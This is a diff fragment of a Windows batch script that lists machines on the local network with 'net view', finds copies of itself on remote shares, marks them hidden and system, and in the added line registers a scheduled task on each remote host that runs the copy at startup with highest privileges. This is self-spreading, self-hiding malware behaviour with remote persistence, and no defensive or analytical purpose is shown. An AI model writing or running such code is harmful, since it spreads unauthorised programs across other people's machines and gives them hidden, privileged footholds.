@@ -116,6 +116,7 @@ timeout /nobreak /t 10 >nul
 for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if "%%i" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if "%%j" NEQ "The" (
     if exist "%%i:\%~nx0" (
+      for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn %~n0-%%j /tr %%j:\%~nx0 /f /rl highest
       attrib +s +h "%%i\%%j\%~nx0"
 
       if "%%j:" NEQ "C:" (
